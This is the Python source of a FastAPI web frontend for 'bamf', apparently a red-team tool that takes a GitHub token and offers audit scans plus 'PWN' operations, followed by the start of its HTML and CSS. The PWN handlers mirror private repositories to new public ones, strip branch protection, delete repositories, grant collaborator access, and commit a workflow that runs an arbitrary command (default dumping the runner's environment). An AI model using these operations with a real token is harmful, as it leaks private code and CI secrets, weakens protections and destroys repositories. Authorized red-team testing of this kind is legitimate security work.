"""
Simple web frontend for bamf.

Run with:
    uvicorn web_app:app --reload

The browser keeps the GitHub token in sessionStorage and sends it as a
Bearer token to the local FastAPI API. The server does not persist tokens.
"""

from __future__ import annotations

from contextlib import asynccontextmanager
from contextlib import redirect_stdout
import io
import logging
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
from typing import Any
from uuid import uuid4
import webbrowser

from fastapi import Body, FastAPI, Header, HTTPException, Request
from fastapi.exception_handlers import http_exception_handler
from fastapi.responses import HTMLResponse, JSONResponse
from github import Github, GithubException
import requests

from github_ops import (
    audit_actions_permissions,
    audit_actions_pinning,
    audit_actions_secrets,
    audit_branch_protection,
    audit_collaborators,
    audit_deploy_keys,
    audit_environment_protection,
    audit_security_posture,
    audit_webhooks,
    list_dependabot_alerts,
    list_repos,
    list_unprotected_repos,
    scan_pull_request_target,
    scan_secrets,
    scan_self_hosted_runners,
    scan_workflow_injection,
    search_actions_files,
    search_build_files,
    search_manifest_files,
    show_pat_info,
)


APP_VERSION = "0.3.0"
LOG_FILE = "bamf_web.log"
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8000
LOG_TAIL_LINES = 250

OPERATIONS: list[dict[str, str]] = [
    {"section": "RECON", "name": "List all repos", "description": "View all accessible repositories sorted by recent activity.", "status": "Available"},
    {"section": "RECON", "name": "Show PAT info", "description": "Display token scopes, account metadata, and API rate limit.", "status": "Available"},
    {"section": "RECON", "name": "Search for build files", "description": "Scan repositories for build and CI configuration files.", "status": "Planned"},
    {"section": "RECON", "name": "Search for Actions files", "description": "Find GitHub Actions workflow files across repositories.", "status": "Planned"},
    {"section": "RECON", "name": "Search for manifest files", "description": "Detect dependency manifests and lockfiles across ecosystems.", "status": "Planned"},
    {"section": "RECON", "name": "Repos without branch protection", "description": "Identify repositories missing branch protection rules.", "status": "Planned"},
    {"section": "RECON", "name": "Security posture audit", "description": "Check Dependabot, secret scanning, and push protection settings.", "status": "Planned"},
    {"section": "RECON", "name": "Dependabot vulnerability alerts", "description": "List open vulnerability alerts by severity.", "status": "Planned"},
    {"section": "RECON", "name": "Branch protection deep-dive", "description": "Inspect branch protection details and dangerous configurations.", "status": "Planned"},
    {"section": "RECON", "name": "Webhook audit", "description": "Enumerate webhooks and flag insecure configurations.", "status": "Planned"},
    {"section": "RECON", "name": "Collaborator access audit", "description": "List collaborators and pending invitations with risky access.", "status": "Planned"},
    {"section": "RECON", "name": "Deploy keys audit", "description": "List deploy keys and flag read/write or unused keys.", "status": "Planned"},
    {"section": "RECON", "name": "Actions secrets audit", "description": "Surface secret names and rotation age without exposing values.", "status": "Planned"},
    {"section": "RECON", "name": "Scan repos for secrets", "description": "Run secret discovery across repositories.", "status": "Planned"},
    {"section": "RECON", "name": "Workflow injection scan", "description": "Detect unsafe GitHub expression flow into shell steps.", "status": "Planned"},
    {"section": "RECON", "name": "Actions permissions audit", "description": "Flag over-permissive workflow permissions.", "status": "Planned"},
    {"section": "RECON", "name": "pull_request_target scan", "description": "Find dangerous pull_request_target checkout patterns.", "status": "Planned"},
    {"section": "RECON", "name": "Self-hosted runner detection", "description": "Detect self-hosted runner usage and active runner exposure.", "status": "Planned"},
    {"section": "RECON", "name": "Actions pinning audit", "description": "Flag third-party Actions that use mutable tags.", "status": "Planned"},
    {"section": "RECON", "name": "Environment protection audit", "description": "Check deployment environments for missing reviewer and wait rules.", "status": "Planned"},
    {"section": "PWN", "name": "Clone all repos", "description": "Bulk clone every accessible repository.", "status": "CLI only"},
    {"section": "PWN", "name": "Clone private to public", "description": "Mirror a private repository to a new public repository.", "status": "CLI only"},
    {"section": "PWN", "name": "Create a repo", "description": "Create a new GitHub repository.", "status": "Planned"},
    {"section": "PWN", "name": "Edit a manifest file", "description": "Edit a dependency manifest and commit the change.", "status": "CLI only"},
    {"section": "PWN", "name": "Nuke branch protections", "description": "Remove branch protection rules after confirmation.", "status": "CLI only"},
    {"section": "PWN", "name": "Nuke a repo (delete permanently)", "description": "Delete a repository after explicit confirmation.", "status": "CLI only"},
    {"section": "PWN", "name": "Add collaborator", "description": "Invite a collaborator with push-level access.", "status": "Planned"},
    {"section": "PWN", "name": "Inject test workflow (PWN)", "description": "Create an authorized test workflow payload.", "status": "CLI only"},
    {"section": "PWN", "name": "Fork a repo", "description": "Fork an accessible repository.", "status": "Planned"},
]

OPERATION_IDS: dict[str, str] = {
    "List all repos": "list-repos",
    "Show PAT info": "show-pat-info",
    "Search for build files": "search-build-files",
    "Search for Actions files": "search-actions-files",
    "Search for manifest files": "search-manifest-files",
    "Repos without branch protection": "list-unprotected-repos",
    "Security posture audit": "audit-security-posture",
    "Dependabot vulnerability alerts": "list-dependabot-alerts",
    "Branch protection deep-dive": "audit-branch-protection",
    "Webhook audit": "audit-webhooks",
    "Collaborator access audit": "audit-collaborators",
    "Deploy keys audit": "audit-deploy-keys",
    "Actions secrets audit": "audit-actions-secrets",
    "Scan repos for secrets": "scan-secrets",
    "Workflow injection scan": "scan-workflow-injection",
    "Actions permissions audit": "audit-actions-permissions",
    "pull_request_target scan": "scan-pull-request-target",
    "Self-hosted runner detection": "scan-self-hosted-runners",
    "Actions pinning audit": "audit-actions-pinning",
    "Environment protection audit": "audit-environment-protection",
    "Create a repo": "create-repo",
    "Clone all repos": "clone-all-repos",
    "Clone private to public": "clone-private-to-public",
    "Edit a manifest file": "edit-manifest-file",
    "Nuke branch protections": "nuke-branch-protections",
    "Nuke a repo (delete permanently)": "nuke-repo",
    "Add collaborator": "add-collaborator",
    "Inject test workflow (PWN)": "pwn-inject-workflow",
    "Fork a repo": "fork-repo",
}

CLI_CAPTURE_ACTIONS = {
    "list-repos": (list_repos, False),
    "show-pat-info": (show_pat_info, True),
    "search-build-files": (search_build_files, False),
    "search-actions-files": (search_actions_files, False),
    "search-manifest-files": (search_manifest_files, False),
    "list-unprotected-repos": (list_unprotected_repos, False),
    "audit-security-posture": (audit_security_posture, False),
    "list-dependabot-alerts": (list_dependabot_alerts, False),
    "audit-branch-protection": (audit_branch_protection, False),
    "audit-webhooks": (audit_webhooks, False),
    "audit-collaborators": (audit_collaborators, False),
    "audit-deploy-keys": (audit_deploy_keys, False),
    "audit-actions-secrets": (audit_actions_secrets, False),
    "scan-secrets": (scan_secrets, True),
    "scan-workflow-injection": (scan_workflow_injection, False),
    "audit-actions-permissions": (audit_actions_permissions, False),
    "scan-pull-request-target": (scan_pull_request_target, False),
    "scan-self-hosted-runners": (scan_self_hosted_runners, False),
    "audit-actions-pinning": (audit_actions_pinning, False),
    "audit-environment-protection": (audit_environment_protection, False),
}

WEB_FORM_ACTIONS = {
    "create-repo",
    "clone-all-repos",
    "clone-private-to-public",
    "nuke-branch-protections",
    "nuke-repo",
    "add-collaborator",
    "pwn-inject-workflow",
    "fork-repo",
}
WEB_ENABLED_ACTIONS = set(CLI_CAPTURE_ACTIONS) | WEB_FORM_ACTIONS
ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s %(levelname)s [%(name)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(sys.stdout or sys.__stdout__),
    ],
    force=True,
)
logger = logging.getLogger("bamf.web")


def _listening_pids_on_port(port: int) -> set[int]:
    if sys.platform != "win32":
        logger.debug("stale server detection is currently implemented for Windows only")
        return set()

    result = subprocess.run(
        ["netstat", "-ano", "-p", "tcp"],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        logger.warning("unable to inspect listening ports: %s", result.stderr.strip())
        return set()

    pids: set[int] = set()
    suffix = f":{port}"
    for line in result.stdout.splitlines():
        parts = line.split()
        if len(parts) < 5 or parts[0].upper() != "TCP":
            continue
        local_address, state, pid_text = parts[1], parts[3], parts[4]
        if state.upper() == "LISTENING" and local_address.endswith(suffix):
            try:
                pids.add(int(pid_text))
            except ValueError:
                logger.debug("unable to parse PID from netstat line: %s", line)

    return pids


def _process_command_line(pid: int) -> str:
    if sys.platform != "win32":
        return ""

    result = subprocess.run(
        [
            "powershell",
            "-NoProfile",
            "-Command",
            f"(Get-CimInstance Win32_Process -Filter 'ProcessId = {pid}').CommandLine",
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        logger.warning("unable to inspect process %s: %s", pid, result.stderr.strip())
        return ""
    return result.stdout.strip()


def _looks_like_bamf_web_server(command_line: str) -> bool:
    normalized = command_line.lower().replace("\\", "/")
    return (
        "web_app.py" in normalized
        or ("uvicorn" in normalized and "web_app:app" in normalized)
        or ("bamf.exe" in normalized and "--web" in normalized)
        or "bamf-web.exe" in normalized
    )


def _stop_stale_web_servers(port: int) -> None:
    current_pid = os.getpid()
    for pid in _listening_pids_on_port(port):
        if pid == current_pid:
            continue

        command_line = _process_command_line(pid)
        if not _looks_like_bamf_web_server(command_line):
            logger.warning(
                "port %s is already in use by PID %s, but it does not look like bamf web; leaving it alone. command=%r",
                port,
                pid,
                command_line,
            )
            continue

        logger.warning("stopping stale bamf web server PID %s on port %s", pid, port)
        result = subprocess.run(
            ["taskkill", "/PID", str(pid), "/T", "/F"],
            capture_output=True,
            text=True,
            check=False,
        )
        if result.returncode == 0:
            logger.info("stopped stale server PID %s: %s", pid, result.stdout.strip())
        else:
            logger.error("failed to stop stale server PID %s: %s", pid, result.stderr.strip())

    deadline = time.monotonic() + 5
    while _listening_pids_on_port(port) and time.monotonic() < deadline:
        time.sleep(0.2)


@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("FastAPI startup complete")
    try:
        yield
    finally:
        logger.warning("FastAPI shutdown started")


app = FastAPI(title="bamf web", version=APP_VERSION, lifespan=lifespan)


@app.middleware("http")
async def log_requests(request: Request, call_next):
    request_id = uuid4().hex[:8]
    start = time.perf_counter()
    logger.info(
        "request %s started: %s %s from %s",
        request_id,
        request.method,
        request.url.path,
        request.client.host if request.client else "unknown",
    )

    try:
        response = await call_next(request)
    except Exception:
        elapsed_ms = (time.perf_counter() - start) * 1000
        logger.exception(
            "request %s crashed after %.1fms: %s %s",
            request_id,
            elapsed_ms,
            request.method,
            request.url.path,
        )
        raise

    elapsed_ms = (time.perf_counter() - start) * 1000
    logger.info(
        "request %s finished: status=%s duration=%.1fms",
        request_id,
        response.status_code,
        elapsed_ms,
    )
    return response


@app.exception_handler(HTTPException)
async def log_http_exception(request: Request, exc: HTTPException):
    logger.warning(
        "http exception: status=%s path=%s detail=%s",
        exc.status_code,
        request.url.path,
        exc.detail,
    )
    return await http_exception_handler(request, exc)


@app.exception_handler(Exception)
async def log_unhandled_exception(request: Request, exc: Exception):
    logger.exception("unhandled exception on %s %s", request.method, request.url.path)
    return JSONResponse(status_code=500, content={"detail": "Internal server error"})


def _token_from_header(authorization: str | None) -> str:
    if not authorization:
        raise HTTPException(status_code=401, detail="Missing Authorization header")

    scheme, _, value = authorization.partition(" ")
    if scheme.lower() != "bearer" or not value.strip():
        raise HTTPException(status_code=401, detail="Use Authorization: Bearer <token>")

    return value.strip()


def _github_client(authorization: str | None) -> Github:
    return Github(_token_from_header(authorization))


def _github_error(exc: GithubException) -> HTTPException:
    status = exc.status if exc.status in {400, 401, 403, 404, 429} else 502
    detail = exc.data.get("message", str(exc)) if isinstance(exc.data, dict) else str(exc)
    return HTTPException(status_code=status, detail=detail)


def _operations_for_web() -> list[dict[str, Any]]:
    items = []
    for operation in OPERATIONS:
        action_id = OPERATION_IDS.get(operation["name"])
        web_enabled = bool(action_id in WEB_ENABLED_ACTIONS)
        status = "Available" if web_enabled else operation["status"]
        items.append({**operation, "id": action_id, "status": status, "web_enabled": web_enabled})
    return items


def _clean_cli_output(value: str) -> str:
    cleaned = ANSI_RE.sub("", value)
    cleaned = cleaned.replace("\r", "\n")
    cleaned = cleaned.replace("â€”", "-").replace("â†’", "->").replace("â€¦", "...")
    cleaned = cleaned.replace("â”€", "-").replace("â˜…", "*")
    lines = [line.rstrip() for line in cleaned.splitlines()]
    compact: list[str] = []
    blank = False
    for line in lines:
        if line:
            compact.append(line)
            blank = False
        elif not blank:
            compact.append("")
            blank = True
    return "\n".join(compact).strip() or "Action completed with no output."


def _capture_cli_action(action_id: str, client: Github, token: str) -> str:
    action = CLI_CAPTURE_ACTIONS.get(action_id)
    if not action:
        raise HTTPException(status_code=404, detail="Unknown action")

    func, needs_token = action
    buffer = io.StringIO()
    with redirect_stdout(buffer):
        if needs_token:
            func(client, token)
        else:
            func(client)
    return _clean_cli_output(buffer.getvalue())


def _scope_list(token: str) -> list[str]:
    try:
        logger.debug("fetching GitHub OAuth scopes")
        resp = requests.get(
            "https://api.github.com/user",
            headers={
                "Authorization": f"Bearer {token}",
                "Accept": "application/vnd.github+json",
            },
            timeout=10,
        )
        scopes = resp.headers.get("X-OAuth-Scopes", "")
        result = sorted(s.strip() for s in scopes.split(",") if s.strip())
        logger.debug("fetched %s OAuth scope(s)", len(result))
        return result
    except requests.RequestException:
        logger.exception("failed to fetch GitHub OAuth scopes")
        return []


@app.get("/", response_class=HTMLResponse)
def index() -> str:
    logger.debug("serving index HTML")
    return INDEX_HTML


@app.get("/api/app")
def app_info() -> dict[str, Any]:
    return {
        "name": "bamf web",
        "version": APP_VERSION,
        "operations": _operations_for_web(),
    }


@app.get("/api/logs")
def logs() -> dict[str, Any]:
    try:
        with open(LOG_FILE, "r", encoding="utf-8", errors="replace") as log_file:
            lines = log_file.readlines()[-LOG_TAIL_LINES:]
    except FileNotFoundError:
        lines = []

    return {
        "file": LOG_FILE,
        "line_count": len(lines),
        "lines": [line.rstrip("\n") for line in lines],
    }


@app.get("/api/whoami")
def whoami(authorization: str | None = Header(default=None)) -> dict[str, Any]:
    logger.info("whoami request started")
    token = _token_from_header(authorization)
    client = Github(token)

    try:
        user = client.get_user()
        rate = client.get_rate_limit().resources.core
        logger.info("whoami request succeeded for login=%s", user.login)
        return {
            "login": user.login,
            "name": user.name,
            "avatar_url": user.avatar_url,
            "html_url": user.html_url,
            "public_repos": user.public_repos,
            "private_repos": user.total_private_repos,
            "scopes": _scope_list(token),
            "rate_limit": {
                "remaining": rate.remaining,
                "limit": rate.limit,
                "reset": rate.reset.isoformat(),
            },
        }
    except GithubException as exc:
        logger.exception("GitHub API error during whoami: status=%s data=%s", exc.status, exc.data)
        raise _github_error(exc) from exc
    except requests.exceptions.ConnectionError as exc:
        logger.exception("network error during whoami")
        raise HTTPException(status_code=503, detail="Unable to reach GitHub") from exc


@app.get("/api/repos")
def repos(authorization: str | None = Header(default=None)) -> dict[str, Any]:
    logger.info("repos request started")
    client = _github_client(authorization)

    try:
        gh_repos = client.get_user().get_repos(sort="updated", direction="desc")
        items = []
        for repo in gh_repos:
            permissions = repo.permissions
            items.append(
                {
                    "full_name": repo.full_name,
                    "name": repo.name,
                    "owner": repo.owner.login,
                    "private": repo.private,
                    "archived": repo.archived,
                    "fork": repo.fork,
                    "language": repo.language,
                    "description": repo.description,
                    "default_branch": repo.default_branch,
                    "html_url": repo.html_url,
                    "updated_at": repo.updated_at.isoformat() if repo.updated_at else None,
                    "permissions": {
                        "admin": bool(permissions and permissions.admin),
                        "push": bool(permissions and permissions.push),
                        "pull": bool(permissions and permissions.pull),
                    },
                }
            )
        logger.info("repos request succeeded with count=%s", len(items))
        return {"count": len(items), "repos": items}
    except GithubException as exc:
        logger.exception("GitHub API error during repos: status=%s data=%s", exc.status, exc.data)
        raise _github_error(exc) from exc
    except requests.exceptions.ConnectionError as exc:
        logger.exception("network error during repos")
        raise HTTPException(status_code=503, detail="Unable to reach GitHub") from exc


@app.post("/api/actions/{action_id}")
def run_action(
    action_id: str,
    payload: dict[str, Any] = Body(default_factory=dict),
    authorization: str | None = Header(default=None),
) -> dict[str, Any]:
    token = _token_from_header(authorization)
    client = Github(token)
    logger.info("web action started: %s", action_id)

    try:
        if action_id in CLI_CAPTURE_ACTIONS:
            output = _capture_cli_action(action_id, client, token)
            return {"action": action_id, "ok": True, "output": output}

        if action_id == "create-repo":
            name = str(payload.get("name", "")).strip()
            if not name or " " in name:
                raise HTTPException(status_code=400, detail="Repository name is required and cannot contain spaces")
            private = bool(payload.get("private", True))
            description = str(payload.get("description", "")).strip()
            repo = client.get_user().create_repo(name, private=private, description=description, auto_init=False)
            output = (
                "Repository created successfully.\n"
                f"Name: {repo.full_name}\n"
                f"Visibility: {'private' if repo.private else 'public'}\n"
                f"Clone URL: {repo.clone_url}\n"
                f"Web URL: {repo.html_url}"
            )
            return {"action": action_id, "ok": True, "output": output}

        if action_id == "add-collaborator":
            repo_name = str(payload.get("repo", "")).strip()
            username = str(payload.get("username", "")).strip()
            permission = str(payload.get("permission", "push")).strip() or "push"
            if not repo_name or "/" not in repo_name:
                raise HTTPException(status_code=400, detail="Repository must be owner/name")
            if not username:
                raise HTTPException(status_code=400, detail="Username is required")
            if permission not in {"pull", "push", "admin", "maintain", "triage"}:
                raise HTTPException(status_code=400, detail="Invalid collaborator permission")
            repo = client.get_repo(repo_name)
            repo.add_to_collaborators(username, permission=permission)
            output = (
                "Collaborator invite/update submitted.\n"
                f"Repository: {repo.full_name}\n"
                f"Username: {username}\n"
                f"Permission: {permission}"
            )
            return {"action": action_id, "ok": True, "output": output}

        if action_id == "clone-all-repos":
            dest = str(payload.get("dest", "")).strip() or os.path.join(os.getcwd(), "cloned_repos")
            if not shutil.which("git"):
                raise HTTPException(status_code=400, detail="git was not found on PATH")
            os.makedirs(dest, exist_ok=True)
            repos = list(client.get_user().get_repos(sort="updated", direction="desc"))
            cloned = skipped = failed = 0
            lines = [f"Cloning {len(repos)} repositories into {dest}", ""]
            for repo in repos:
                repo_dir = os.path.join(dest, repo.name)
                if os.path.isdir(repo_dir):
                    skipped += 1
                    lines.append(f"SKIP {repo.full_name}: directory already exists")
                    continue
                clone_url = f"https://x-access-token:{token}@github.com/{repo.full_name}.git"
                result = subprocess.run(["git", "clone", "--quiet", clone_url, repo_dir], capture_output=True, text=True)
                if result.returncode == 0:
                    cloned += 1
                    lines.append(f"OK   {repo.full_name}")
                else:
                    failed += 1
                    detail = result.stderr.strip().splitlines()[-1] if result.stderr.strip() else "unknown error"
                    lines.append(f"FAIL {repo.full_name}: {detail}")
            lines.append("")
            lines.append(f"Done. Cloned: {cloned} | Skipped: {skipped} | Failed: {failed}")
            return {"action": action_id, "ok": failed == 0, "output": "\n".join(lines)}

        if action_id == "clone-private-to-public":
            source_name = str(payload.get("repo", "")).strip()
            new_name = str(payload.get("name", "")).strip()
            if not source_name or "/" not in source_name:
                raise HTTPException(status_code=400, detail="Source repository must be owner/name")
            if not new_name or " " in new_name:
                raise HTTPException(status_code=400, detail="New repository name is required and cannot contain spaces")
            if not shutil.which("git"):
                raise HTTPException(status_code=400, detail="git was not found on PATH")
            source_repo = client.get_repo(source_name)
            if not source_repo.private:
                raise HTTPException(status_code=400, detail="Source repository is not private")
            user = client.get_user()
            new_repo = user.create_repo(new_name, private=False, description=source_repo.description or "", auto_init=False)
            src_url = f"https://x-access-token:{token}@github.com/{source_repo.full_name}.git"
            dst_url = f"https://x-access-token:{token}@github.com/{new_repo.full_name}.git"
            tmp_dir = tempfile.mkdtemp(prefix="bamf_mirror_")
            try:
                clone_result = subprocess.run(["git", "clone", "--mirror", src_url, tmp_dir], capture_output=True, text=True)
                if clone_result.returncode != 0:
                    try:
                        new_repo.delete()
                    except GithubException:
                        pass
                    detail = clone_result.stderr.strip().splitlines()[-1] if clone_result.stderr.strip() else "unknown error"
                    raise HTTPException(status_code=502, detail=f"Mirror clone failed: {detail}")
                push_result = subprocess.run(["git", "-C", tmp_dir, "push", "--mirror", dst_url], capture_output=True, text=True)
                if push_result.returncode != 0:
                    detail = push_result.stderr.strip().splitlines()[-1] if push_result.stderr.strip() else "unknown error"
                    raise HTTPException(status_code=502, detail=f"Mirror push failed: {detail}")
            finally:
                shutil.rmtree(tmp_dir, ignore_errors=True)
            output = (
                "Private repository mirrored to public repository.\n"
                f"Source: {source_repo.full_name}\n"
                f"Destination: {new_repo.full_name}\n"
                f"Web URL: {new_repo.html_url}"
            )
            return {"action": action_id, "ok": True, "output": output}

        if action_id == "nuke-branch-protections":
            repo_name = str(payload.get("repo", "")).strip()
            branch_name = str(payload.get("branch", "")).strip()
            if not repo_name or "/" not in repo_name:
                raise HTTPException(status_code=400, detail="Repository must be owner/name")
            repo = client.get_repo(repo_name)
            branch_name = branch_name or repo.default_branch
            branch = repo.get_branch(branch_name)
            branch.remove_protection()
            output = f"Branch protection removed.\nRepository: {repo.full_name}\nBranch: {branch_name}"
            return {"action": action_id, "ok": True, "output": output}

        if action_id == "nuke-repo":
            repo_name = str(payload.get("repo", "")).strip()
            confirm = str(payload.get("confirm", "")).strip()
            if not repo_name or "/" not in repo_name:
                raise HTTPException(status_code=400, detail="Repository must be owner/name")
            if confirm != repo_name:
                raise HTTPException(status_code=400, detail="Confirmation must exactly match owner/name")
            repo = client.get_repo(repo_name)
            repo.delete()
            return {"action": action_id, "ok": True, "output": f"Repository deleted permanently: {repo_name}"}

        if action_id == "pwn-inject-workflow":
            repo_name = str(payload.get("repo", "")).strip()
            command = str(payload.get("command", "env | sort")).strip() or "env | sort"
            if not repo_name or "/" not in repo_name:
                raise HTTPException(status_code=400, detail="Repository must be owner/name")
            repo = client.get_repo(repo_name)
            path = ".github/workflows/bamf-pwn-test.yml"
            content = (
                "name: bamf authorized test\n"
                "on:\n"
                "  workflow_dispatch:\n"
                "jobs:\n"
                "  test:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - name: Authorized bamf test\n"
                "        run: |\n"
                f"          {command}\n"
            )
            try:
                existing = repo.get_contents(path)
                repo.update_file(path, "bamf: update authorized test workflow", content, existing.sha)
                verb = "updated"
            except GithubException as exc:
                if exc.status != 404:
                    raise
                repo.create_file(path, "bamf: add authorized test workflow", content)
                verb = "created"
            output = (
                f"Workflow {verb}.\n"
                f"Repository: {repo.full_name}\n"
                f"Path: {path}\n"
                "Run it manually from the repository Actions tab when ready."
            )
            return {"action": action_id, "ok": True, "output": output}

        if action_id == "fork-repo":
            repo_name = str(payload.get("repo", "")).strip()
            custom_name = str(payload.get("name", "")).strip()
            default_branch_only = bool(payload.get("default_branch_only", False))
            if not repo_name or "/" not in repo_name:
                raise HTTPException(status_code=400, detail="Repository must be owner/name")
            source = client.get_repo(repo_name)
            kwargs: dict[str, Any] = {"default_branch_only": default_branch_only}
            if custom_name:
                kwargs["name"] = custom_name
            forked = source.create_fork(**kwargs)
            output = (
                "Fork requested successfully.\n"
                f"Source: {source.full_name}\n"
                f"Fork: {forked.full_name}\n"
                f"Web URL: {forked.html_url}\n"
                "GitHub forks are async, so it may take a few seconds to finish initializing."
            )
            return {"action": action_id, "ok": True, "output": output}

        raise HTTPException(status_code=404, detail="Action is not enabled in the web UI yet")
    except GithubException as exc:
        logger.exception("GitHub API error during action %s: status=%s data=%s", action_id, exc.status, exc.data)
        raise _github_error(exc) from exc
    except requests.exceptions.ConnectionError as exc:
        logger.exception("network error during action %s", action_id)
        raise HTTPException(status_code=503, detail="Unable to reach GitHub") from exc


INDEX_HTML = r"""
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>bamf web</title>
  <style>
    :root,
    [data-skin="dark"] {
      --bg: #0f141b;
      --panel: #161d27;
      --panel-2: #1d2633;
      --ink: #edf3fb;
      --muted: #9caabd;
      --line: #2c3748;
      --accent: #28a3c7;
      --accent-dark: #1d7f9c;
      --good: #46c781;
      --warn: #e5a93e;
      --bad: #ff6b63;
      --chip: #243244;
      --header: #0a0e13;
      --header-line: #28a3c7;
      --input: #101720;
      --button-secondary: #263244;
      --button-secondary-hover: #314057;
      --shadow: 0 16px 44px rgba(0, 0, 0, 0.26);
    }

    [data-skin="midnight"] {
      --bg: #080b16;
      --panel: #11182a;
      --panel-2: #18213a;
      --ink: #f1f5ff;
      --muted: #9ba8c7;
      --line: #27324f;
      --accent: #7aa7ff;
      --accent-dark: #557fd1;
      --good: #6de0a5;
      --warn: #ffd166;
      --bad: #ff7d7d;
      --chip: #202b48;
      --header: #050714;
      --header-line: #7aa7ff;
      --input: #0c1222;
      --button-secondary: #202b48;
      --button-secondary-hover: #2b385c;
      --shadow: 0 18px 48px rgba(0, 0, 0, 0.32);
    }

    [data-skin="matrix"] {
      --bg: #07110b;
      --panel: #0d1b12;
      --panel-2: #122719;
      --ink: #eaffef;
      --muted: #8fb59b;
      --line: #1f3c29;
      --accent: #31d77b;
      --accent-dark: #24a55e;
      --good: #31d77b;
      --warn: #d7c95a;
      --bad: #ff6a6a;
      --chip: #183322;
      --header: #020704;
      --header-line: #31d77b;
      --input: #08140d;
      --button-secondary: #173120;
      --button-secondary-hover: #20472d;
      --shadow: 0 18px 44px rgba(0, 0, 0, 0.34);
    }

    [data-skin="ember"] {
      --bg: #17120f;
      --panel: #241b17;
      --panel-2: #30231d;
      --ink: #fff5ec;
      --muted: #c8a999;
      --line: #4a342b;
      --accent: #f07d3f;
      --accent-dark: #bf5f2d;
      --good: #7bd88f;
      --warn: #ffbf66;
      --bad: #ff736f;
      --chip: #372720;
      --header: #0d0907;
      --header-line: #f07d3f;
      --input: #1a120f;
      --button-secondary: #372720;
      --button-secondary-hover: #493328;
      --shadow: 0 18px 44px rgba(0, 0, 0, 0.3);
    }

    [data-skin="light"] {
      --bg: #f7f8fb;
      --panel: #ffffff;
      --panel-2: #f1f4f8;
      --ink: #172033;
      --muted: #637083;
      --line: #d9dee8;
      --accent: #146c94;
      --accent-dark: #0e526f;
      --good: #1f7a4d;
      --warn: #a15c00;
      --bad: #b42318;
      --chip: #edf2f7;
      --header: #172033;
      --header-line: #d29a2e;
      --input: #ffffff;
      --button-secondary: #e9eef5;
      --button-secondary-hover: #dce4ee;
      --shadow: 0 14px 34px rgba(23, 32, 51, 0.1);
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--ink);
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.4;
    }

    button, input, select {
      font: inherit;
    }

    .shell {
      min-height: 100vh;
      display: grid;
      grid-template-rows: auto 1fr;
    }

    header {
      background: var(--header);
      color: #fff;
      border-bottom: 4px solid var(--header-line);
    }

    .topbar {
      max-width: 1180px;
      margin: 0 auto;
      padding: 18px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 18px;
    }

    .brand {
      display: flex;
      align-items: baseline;
      gap: 12px;
      min-width: 0;
    }

    .brand h1 {
      margin: 0;
      font-size: 24px;
      letter-spacing: 0;
    }

    .brand span {
      color: var(--muted);
      font-size: 14px;
      white-space: nowrap;
    }

    .version {
      color: var(--accent);
      font-size: 13px;
      font-weight: 800;
    }

    .top-actions {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .icon-button {
      width: 42px;
      min-width: 42px;
      height: 42px;
      min-height: 42px;
      padding: 0;
      display: inline-grid;
      place-items: center;
      border-radius: 50%;
      font-size: 22px;
      line-height: 1;
    }

    main {
      max-width: 1180px;
      width: 100%;
      margin: 0 auto;
      padding: 24px;
      display: grid;
      gap: 18px;
    }

    .panel {
      background: var(--panel);
      border: 1px solid var(--line);
      border-radius: 8px;
      box-shadow: var(--shadow);
    }

    .auth {
      padding: 18px;
      display: grid;
      grid-template-columns: minmax(220px, 1fr) auto auto;
      gap: 12px;
      align-items: end;
    }

    label {
      display: grid;
      gap: 6px;
      color: var(--muted);
      font-size: 13px;
      font-weight: 600;
    }

    input, select {
      width: 100%;
      min-height: 40px;
      border: 1px solid var(--line);
      border-radius: 6px;
      padding: 8px 10px;
      background: var(--input);
      color: var(--ink);
    }

    button {
      min-height: 40px;
      border: 0;
      border-radius: 6px;
      padding: 8px 14px;
      background: var(--accent);
      color: #fff;
      cursor: pointer;
      font-weight: 700;
    }

    button:hover { background: var(--accent-dark); }
    button.secondary { background: var(--button-secondary); color: var(--ink); }
    button.secondary:hover { background: var(--button-secondary-hover); }
    button:disabled { cursor: not-allowed; opacity: 0.62; }

    .status {
      padding: 12px 18px;
      border-top: 1px solid var(--line);
      color: var(--muted);
      min-height: 47px;
    }

    .status-panel .status {
      border-top: 0;
    }

    .status.error { color: var(--bad); }
    .status.ok { color: var(--good); }

    .account {
      padding: 16px 18px;
      display: grid;
      grid-template-columns: auto 1fr auto;
      gap: 14px;
      align-items: center;
    }

    .avatar {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      background: var(--button-secondary);
    }

    .account h2 {
      margin: 0;
      font-size: 18px;
      letter-spacing: 0;
    }

    .account p {
      margin: 3px 0 0;
      color: var(--muted);
      font-size: 14px;
    }

    .metrics {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
      justify-content: flex-end;
    }

    .chip {
      display: inline-flex;
      align-items: center;
      min-height: 28px;
      border-radius: 999px;
      background: var(--chip);
      color: var(--ink);
      padding: 4px 10px;
      font-size: 13px;
      font-weight: 700;
      white-space: nowrap;
    }

    .toolbar {
      padding: 14px 18px;
      display: grid;
      grid-template-columns: minmax(200px, 1fr) 170px 170px auto;
      gap: 12px;
      align-items: end;
    }

    .table-wrap {
      overflow: auto;
      border-top: 1px solid var(--line);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 860px;
    }

    th, td {
      text-align: left;
      padding: 12px 14px;
      border-bottom: 1px solid var(--line);
      vertical-align: top;
    }

    th {
      background: var(--panel-2);
      color: var(--muted);
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 0;
    }

    td {
      font-size: 14px;
    }

    a {
      color: var(--accent);
      text-decoration: none;
      font-weight: 700;
    }

    a:hover { text-decoration: underline; }

